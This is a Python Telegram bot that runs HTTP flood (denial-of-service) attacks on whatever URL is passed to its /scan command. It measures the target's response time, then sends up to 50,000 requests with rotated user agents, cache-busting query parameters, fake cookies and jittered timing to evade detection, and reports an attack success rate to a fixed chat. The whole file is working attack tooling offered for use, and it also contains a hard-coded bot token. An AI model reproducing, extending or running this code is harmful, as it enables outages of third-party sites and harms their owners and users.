import requests
import time
import random
import aiohttp
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import logging

# Bot token and chat ID
BOT_TOKEN = "7116280492:AAE-sZS17F1kaI_IIg8BV2wst7QI8s4T7xk"
CHAT_ID = "6722885929"

# User agents for stealth
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
]

# Logging setup
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger()

# Save logs to text file
def save_log(data):
    with open('attack_log.txt', 'a') as f:
        f.write(f"{data['url']},{data['status']},{data['time']}\n")

# Ping server for latency
async def ping_server(target_url):
    try:
        async with aiohttp.ClientSession() as session:
            start_time = time.time()
            async with session.get(target_url, timeout=10) as response:
                return time.time() - start_time
    except Exception as e:
        logger.error(f"Ping failed: {e}")
        return None

# Test server capacity with async requests
async def test_server_capacity(target_url, num_requests=1000):
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Referer': random.choice(['https://google.com', 'https://bing.com']),
        'Accept-Language': 'en-US,en;q=0.9'
    }
    start_time = time.time()
    async with aiohttp.ClientSession() as session:
        tasks = [session.get(f"{target_url}?q={random.randint(1, 100000)}", headers=headers, timeout=10) for _ in range(num_requests)]
        await asyncio.gather(*tasks, return_exceptions=True)
    total_time = time.time() - start_time
    return total_time / num_requests if num_requests > 0 else float('inf')

# Async attack
async def send_async_request(session, target_url, headers):
    try:
        # Add random query param to bypass caching
        url = f"{target_url}?q={random.randint(1, 100000)}"
        async with session.get(url, headers=headers, timeout=10) as response:
            return {'url': target_url, 'status': response.status, 'time': time.time()}
    except Exception as e:
        logger.error(f"Request failed: {e}")
        return {'url': target_url, 'status': 'failed', 'error': str(e), 'time': time.time()}

async def async_attack(target_url, num_requests):
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Referer': random.choice(['https://google.com', 'https://bing.com']),
        'Accept-Language': 'en-US,en;q=0.9',
        'Cookie': f'session_id={random.randint(1000, 9999)}'
    }
    async with aiohttp.ClientSession() as session:
        tasks = [send_async_request(session, target_url, headers) for _ in range(num_requests)]
        # Add random delays to mimic human traffic
        for task in tasks:
            await asyncio.sleep(random.uniform(0.01, 0.1))
        results = await asyncio.gather(*tasks)
        return [r for r in results if r]

# Main scan function
async def scan_server(target_url, update, context):
    logger.info(f"Scanning {target_url}")
    await context.bot.send_message(chat_id=CHAT_ID, text=f"Starting scan on {target_url} - {time.strftime('%Y-%m-%d %H:%M:%S')}")

    # Ping server
    response_time = await ping_server(target_url)
    if response_time is None:
        await context.bot.send_message(chat_id=CHAT_ID, text="Server’s fucking unreachable")
        return
    await context.bot.send_message(chat_id=CHAT_ID, text=f"Response time: {response_time:.4f} seconds")

    # Test capacity
    avg_request_time = await test_server_capacity(target_url)
    await context.bot.send_message(chat_id=CHAT_ID, text=f"Average request time: {avg_request_time:.4f} seconds")

    # Determine server strength
    if response_time < 1 and avg_request_time < 0.1:
        strength = "Strong"
        num_requests = 10000
    elif response_time < 2 or avg_request_time < 0.5:
        strength = "Medium"
        num_requests = 25000
    else:
        strength = "Weak"
        num_requests = 50000
    await context.bot.send_message(chat_id=CHAT_ID, text=f"Server is {strength}")

    # Attack based on strength
    await context.bot.send_message(chat_id=CHAT_ID, text=f"Hitting with {num_requests} fucking requests...")
    results = await async_attack(target_url, num_requests)

    # Log results and report failures
    failed_requests = [r for r in results if r.get('status') == 'failed']
    for result in results:
        if result and result.get('status') != 'failed':
            save_log(result)
    success_rate = len([r for r in results if r.get('status') == 200]) / len(results) * 100 if results else 0
    await context.bot.send_message(chat_id=CHAT_ID, text=f"Attack done. Success rate: {success_rate:.2f}%")
    if failed_requests:
        error_summary = f"Failed requests: {len(failed_requests)}. Sample error: {failed_requests[0].get('error', 'Unknown')}"
        await context.bot.send_message(chat_id=CHAT_ID, text=error_summary)

# Telegram /scan command
async def scan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_chat.id) != CHAT_ID:
        await update.message.reply_text("Fuck off, you’re not authorized")
        return
    try:
        target_url = context.args[0]
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'https://' + target_url
        await scan_server(target_url, update, context)
    except IndexError:
        await update.message.reply_text("Usage: /scan <url> (e.g., /scan https://example.com)")
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

# Main bot setup
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("scan", scan_command))
    app.run_polling()

if __name__ == "__main__":
    main()
